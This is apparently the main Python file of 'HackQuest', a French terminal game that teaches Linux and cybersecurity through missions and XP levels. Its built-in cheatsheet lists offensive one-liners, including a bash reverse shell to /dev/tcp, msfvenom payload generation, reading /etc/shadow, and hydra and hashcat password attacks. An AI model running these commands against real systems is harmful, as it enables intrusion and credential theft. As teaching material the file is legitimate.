#!/usr/bin/env python3
"""
HackQuest — Learn Linux & Cybersecurity by doing.
Point d'entrée principal.
"""

import sys
import os

# Ajouter le répertoire courant au path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.player import Player, LEVELS, SaveCorrupted, SAVE_FILE
from core.ui import *
from core.game import show_categories, show_missions, run_mission
from core.registry import ALL_MISSIONS as MISSIONS, count_total_missions


def main_menu(player):
    """Menu principal."""
    while True:
        clear()
        banner()

        current, next_lvl = player.get_level_info()
        _, title, icon = current

        # Stats joueur
        print(f"  {icon} {BOLD}{player.name}{RESET}  —  {CYAN}{title}{RESET}")
        print(f"  XP : {YELLOW}{BOLD}{player.xp}{RESET}", end="")
        if next_lvl:
            nxp, ntitle, _ = next_lvl
            bar = xp_bar(player.xp, nxp, level_xp=current[0])
            print(f"  {bar}  → {ntitle} ({nxp - player.xp} XP)")
        else:
            print(f"  {GREEN}★ NIVEAU MAX ★{RESET}")

        completed_total = len(player.completed_missions)
        total_missions = count_total_missions()
        print(f"  Missions : {GREEN}{completed_total}{RESET}/{total_missions}\n")

        separator()
        print(f"""
  {CYAN}{BOLD}[1]{RESET}  🎮  Jouer — Choisir une mission
  {CYAN}{BOLD}[2]{RESET}  📊  Mes statistiques
  {CYAN}{BOLD}[3]{RESET}  📖  Guide des commandes (cheatsheet)
  {CYAN}{BOLD}[4]{RESET}  🗺️   Carte de progression
  {CYAN}{BOLD}[5]{RESET}  ⚙️   Paramètres
  {DIM}[0]  Quitter{RESET}
""")
        separator()

        choice = prompt("Choix")

        if choice == "1":
            result = show_categories(player)
            if result:
                cat_id, cat_data = result
                mission = show_missions(player, cat_id, cat_data)
                if mission:
                    run_mission(player, mission)

        elif choice == "2":
            show_stats(player)

        elif choice == "3":
            show_cheatsheet()

        elif choice == "4":
            show_progress_map(player)

        elif choice == "5":
            show_settings(player)

        elif choice == "0" or choice.lower() == "quit":
            clear()
            print(f"\n{CYAN}  À bientôt, {player.name} ! Continue de hacker ! 🔥{RESET}\n")
            sys.exit(0)


def show_stats(player):
    """Affiche les stats détaillées du joueur."""
    clear()
    banner()
    current, next_lvl = player.get_level_info()
    _, title, icon = current

    print(f"{BOLD}  📊 STATISTIQUES{RESET}\n")

    lines = [
        f"{icon} Nom     : {BOLD}{player.name}{RESET}",
        f"   Rang    : {CYAN}{title}{RESET}",
        f"   XP      : {YELLOW}{player.xp}{RESET}",
    ]
    if next_lvl:
        nxp, ntitle, _ = next_lvl
        lines.append(f"   Prochain: {ntitle} dans {nxp - player.xp} XP")
    lines += [
        f"   Missions: {GREEN}{len(player.completed_missions)}{RESET} complétées",
        f"   Indices : {RED}{player.hints_used}{RESET} utilisés",
    ]

    for line in lines:
        print(f"  {line}")

    from core.registry import ALL_MISSIONS
    print(f"\n{BOLD}  Détail par catégorie :{RESET}\n")
    for cat_id, cat_data in ALL_MISSIONS.items():
        done = sum(1 for m in cat_data["missions"] if m["id"] in player.completed_missions)
        total = len(cat_data["missions"])
        unlocked = cat_id in player.unlocked_categories
        if unlocked:
            filled = int((done / total) * 20) if total else 0
            bar_fill = f"{GREEN}{'█' * filled}{'░' * (20 - filled)}{RESET}"
            print(f"  {cat_data['title']}")
            print(f"    {bar_fill} {done}/{total}\n")
        else:
            print(f"  {DIM}🔒 {cat_data['title']} (verrouillé){RESET}\n")

    press_enter()


def show_cheatsheet():
    """Cheatsheet rapide des commandes Linux et outils cybersécurité."""
    clear()
    banner()
    print(f"{BOLD}  📖 CHEATSHEET RAPIDE{RESET}\n")

    sections = {
        "🐧 Navigation & Fichiers": [
            ("pwd",                      "Répertoire courant"),
            ("ls -la",                   "Liste fichiers (détails + cachés)"),
            ("cd <dir> / cd .. / cd ~",  "Changer de répertoire"),
            ("find / -name <file>",      "Chercher un fichier"),
            ("find / -perm -4000",       "Fichiers SUID (privesc)"),
            ("cat / less / head / tail", "Lire un fichier"),
            ("grep -r 'mot' /chemin",    "Chercher un mot récursivement"),
            ("cp / mv / rm / mkdir",     "Gérer fichiers et dossiers"),
            ("chmod / chown",            "Changer permissions / propriétaire"),
            ("tail -f <file>",           "Suivre un fichier en temps réel"),
        ],
        "🔧 Traitement & Filtrage": [
            ("grep -i / -v / -n / -E",   "Chercher (casse / inverse / ligne / regex)"),
            ("cut -d: -f1 /etc/passwd",  "Extraire une colonne"),
            ("awk '{print $1}' file",    "Extraire un champ"),
            ("sed 's/old/new/g' file",   "Remplacer du texte"),
            ("sort | uniq -c | sort -rn","Compter et trier les occurrences"),
            ("wc -l file",               "Compter les lignes"),
            ("| (pipe)",                 "Chaîner des commandes"),
        ],
        "⚙️ Système & Réseau": [
            ("ps aux / top / htop",      "Lister les processus"),
            ("kill -9 <pid>",            "Tuer un processus"),
            ("ss -tulnp / netstat -anp", "Connexions et ports ouverts"),
            ("ip a / ifconfig",          "Interfaces réseau"),
            ("curl -I <url>",            "Entêtes HTTP"),
            ("wget <url>",               "Télécharger un fichier"),
            ("ssh user@ip",              "Connexion SSH"),
            ("scp src user@ip:dst",      "Copier via SSH"),
            ("crontab -l / -e",          "Tâches planifiées"),
            ("sudo -l",                  "Ce qu'on peut faire en sudo"),
        ],
        "🔭 Recon & Scan": [
            ("nmap -sV -T4 <ip>",        "Scan de ports + versions"),
            ("nmap -A -p- <ip>",         "Scan complet (OS, scripts, tous ports)"),
            ("nmap -sU <ip>",            "Scan UDP"),
            ("subfinder -d domain",      "Sous-domaines passifs"),
            ("amass enum -d domain",     "Sous-domaines actifs + passifs"),
            ("theHarvester -d dom -b all","Emails, IPs, sous-domaines"),
            ("sherlock <username>",      "Rechercher un username partout"),
            ("whois <domain>",           "Infos WHOIS domaine"),
            ("dig <domain> ANY",         "Enregistrements DNS"),
            ("dnsrecon -d <domain>",     "Énumération DNS complète"),
        ],
        "🌐 Web": [
            ("gobuster dir -u <url> -w <wl>","Brute force répertoires"),
            ("ffuf -u <url>/FUZZ -w <wl>",   "Fuzzer rapide"),
            ("nikto -h <url>",               "Scanner vulns web"),
            ("sqlmap -u <url> --dbs",        "Injection SQL automatique"),
            ("sqlmap -u <url> --forms --crawl=2","SQLi sur formulaires"),
            ("wpscan --url <url>",           "Scanner WordPress"),
            ("jwt_tool <token> -T",          "Tester/forger un JWT"),
            ("curl -X POST -d 'user=admin'", "Requête POST"),
            ("burpsuite",                    "Proxy d'interception web"),
        ],
        "💥 Exploitation": [
            ("msfconsole",                   "Lancer Metasploit"),
            ("searchsploit <service>",       "Chercher exploit dans ExploitDB"),
            ("msfvenom -p <payload> -f elf", "Générer un payload"),
            ("nc -lvnp <port>",              "Listener netcat"),
            ("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "Stabiliser shell"),
            ("bash -i >& /dev/tcp/ip/port 0>&1","Reverse shell bash"),
            ("python3 -m http.server 8080",  "Serveur HTTP rapide"),
        ],
        "🔑 Mots de Passe & Hashes": [
            ("hashid <hash>",               "Identifier le type de hash"),
            ("hashcat -m 0 hash.txt wl",    "Casser MD5"),
            ("hashcat -m 1000 hash.txt wl", "Casser NTLM"),
            ("john hash.txt --wordlist=wl", "Casser avec John"),
            ("hydra -l user -P wl ssh://ip","Brute force SSH"),
            ("hydra -l user -P wl http-post-form","Brute force formulaire web"),
            ("echo 'hash' | base64 -d",     "Décoder Base64"),
            ("openssl enc -d -aes-256-cbc", "Déchiffrer AES"),
        ],
        "🏠 Post-Exploitation": [
            ("sudo -l",                     "Vérifier sudo"),
            ("find / -perm -4000 2>/dev/null","Fichiers SUID"),
            ("cat /etc/crontab",            "Tâches cron"),
            ("cat /etc/passwd",             "Comptes utilisateurs"),
            ("cat /etc/shadow",             "Hashes des mots de passe"),
            ("ss -tulnp",                   "Services en écoute"),
            ("linpeas.sh",                  "Script automatique privesc Linux"),
            ("winpeas.exe",                 "Script automatique privesc Windows"),
            ("history",                     "Historique des commandes"),
        ],
        "🔬 Forensics & Stéganographie": [
            ("exiftool <file>",             "Métadonnées d'un fichier"),
            ("binwalk -e <file>",           "Extraire fichiers embarqués"),
            ("strings <file> | grep flag",  "Chercher des chaînes de texte"),
            ("file <file>",                 "Détecter le vrai type de fichier"),
            ("xxd <file> | head",           "Voir en hexadécimal"),
            ("zsteg <image.png>",           "Stéganographie LSB PNG"),
            ("steghide extract -sf <img>",  "Extraire données cachées"),
            ("tshark -r <file.pcap>",       "Analyser un PCAP"),
            ("volatility3 -f dump windows.pslist","Analyser mémoire RAM"),
        ],
        "🔐 Cryptographie CTF": [
            ("echo 'texte' | base64",       "Encoder en Base64"),
            ("echo 'dGV4dGU=' | base64 -d", "Décoder Base64"),
            ("python3 -c \"print(bytes.fromhex('4865'))\"","Hex → texte"),
            ("python3 -c \"print('texte'.encode().hex())\"","Texte → hex"),
            ("hashcat -m 0 / -m 100 / -m 1000","MD5 / SHA1 / NTLM"),
            ("CyberChef (web)",              "Détection et décodage auto"),
            ("rsactftool.py --publickey ...", "Attaques clés RSA"),
            ("factordb.com",                 "Factorisation de nombres"),
        ],
    }

    for section, cmds in sections.items():
        print(f"\n{CYAN}{BOLD}  {section}{RESET}")
        separator("─", 65)
        for cmd, desc in cmds:
            print(f"  {GREEN}{cmd:<45}{RESET} {DIM}{desc}{RESET}")

    press_enter()


def show_progress_map(player):
    """Affiche la carte de progression complète."""
    clear()
    banner()
    print(f"{BOLD}  🗺️  CARTE DE PROGRESSION{RESET}\n")

    from core.registry import ALL_MISSIONS, PROGRESSION_ORDER

    # Groupes visuels
    groups = [
        ("🐧 LINUX FONDAMENTAL", [
            "linux_navigation", "linux_files", "linux_text", "linux_permissions",
            "linux_processes", "linux_network", "linux_archives",
            "linux_system", "linux_scripting", "linux_advanced",
        ]),
        ("🔒 CYBERSÉCURITÉ", [
            "nmap_mastery", "web_recon", "password_attacks", "osint_tools",
            "web_attacks", "exploitation_tools", "post_exploitation",
            "crypto_tools", "forensics_tools", "reverse_engineering",
            "pwn_tools", "network_attacks", "active_directory",
            "wifi_hacking", "jail_utils",
        ]),
    ]

    total_done = len(player.completed_missions)
    total_all  = sum(len(c["missions"]) for c in ALL_MISSIONS.values())

    print(f"  Progression globale : {GREEN}{total_done}{RESET}/{total_all} missions\n")

    for group_name, cat_ids in groups:
        print(f"{CYAN}{BOLD}  ── {group_name} ──{RESET}")
        for cat_id in cat_ids:
            if cat_id not in ALL_MISSIONS:
                continue
            cat = ALL_MISSIONS[cat_id]
            unlocked = cat_id in player.unlocked_categories
            done  = sum(1 for m in cat["missions"] if m["id"] in player.completed_missions)
            total = len(cat["missions"])

            if not unlocked:
                print(f"    {DIM}🔒 {cat['title']}{RESET}")
            elif done == total:
                bar = f"{GREEN}{'█' * 20}{RESET}"
                print(f"    {GREEN}✅{RESET} {BOLD}{cat['title']:<35}{RESET} {bar} {done}/{total}")
            else:
                filled = int((done / total) * 20) if total else 0
                bar = f"{YELLOW}{'█' * filled}{'░' * (20 - filled)}{RESET}"
                print(f"    {YELLOW}⏳{RESET} {cat['title']:<35} {bar} {done}/{total}")
        print()

    press_enter()


def show_settings(player):
    """Paramètres."""
    clear()
    banner()
    print(f"{BOLD}  ⚙️  PARAMÈTRES{RESET}\n")
    print(f"  Nom actuel : {CYAN}{player.name}{RESET}\n")
    print(f"  {CYAN}[1]{RESET} Changer de nom")
    print(f"  {RED}[2]{RESET} Réinitialiser la progression")
    print(f"  {DIM}[0]{RESET} Retour\n")

    choice = prompt("Choix")

    if choice == "1":
        new_name = prompt("Nouveau nom")
        if new_name and new_name != "quit":
            player.name = new_name
            player.save()
            success(f"Nom changé en '{new_name}'")
            press_enter()

    elif choice == "2":
        confirm = prompt("Confirme avec 'RESET' pour tout effacer")
        if confirm == "RESET":
            player.xp = 0
            player.level = 0
            player.completed_missions = []
            player.unlocked_categories = ["linux_navigation", "linux_files"]
            player.hints_used = 0
            player.save()
            success("Progression réinitialisée. Tu repars de zéro !")
            press_enter()


def first_launch(player):
    """Écran de bienvenue pour le premier lancement."""
    clear()
    banner()
    slow_print(f"{CYAN}  Bienvenue dans HackQuest !{RESET}", delay=0.03)
    slow_print(f"  Tu vas apprendre les commandes Linux et la cybersécurité", delay=0.02)
    slow_print(f"  en vivant des aventures dans le terminal.", delay=0.02)
    print()
    slow_print(f"{YELLOW}  ⚡ Le principe :{RESET}", delay=0.02)
    slow_print(f"  → Chaque mission te raconte une histoire.", delay=0.02)
    slow_print(f"  → Tu dois taper la bonne commande pour avancer.", delay=0.02)
    slow_print(f"  → Tu gagnes des XP et tu débloques de nouveaux niveaux.", delay=0.02)
    slow_print(f"  → Tape 'hint' si tu bloques (coûte 5 XP).", delay=0.02)
    print()
    name = prompt("Entre ton pseudo de hacker")
    if name and name != "quit":
        player.name = name
    player.save()
    success(f"Bienvenue, {player.name} ! L'aventure commence...")
    press_enter()


def main():
    player = Player()
    try:
        is_new = not player.load()
    except SaveCorrupted:
        error(f"Ta sauvegarde {SAVE_FILE} est illisible (et sa copie .bak aussi).")
        print(f"  Elle n'a pas été touchée. Répare-la ou renomme-la pour repartir de zéro.\n")
        sys.exit(1)
    if player.restored_from_backup:
        warning("Sauvegarde abîmée : progression restaurée depuis la copie de secours.")
        player.save()
        press_enter()

    if is_new:
        first_launch(player)
    else:
        clear()
        banner()
        current, _ = player.get_level_info()
        _, title, icon = current
        slow_print(f"  {icon} Bon retour, {CYAN}{BOLD}{player.name}{RESET} ! ({title} — {player.xp} XP)", delay=0.02)
        press_enter()

    main_menu(player)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # Ctrl+C pendant une animation (en dehors d'une saisie)
        print(f"\n{CYAN}  À bientôt ! Ta progression est sauvegardée.{RESET}\n")
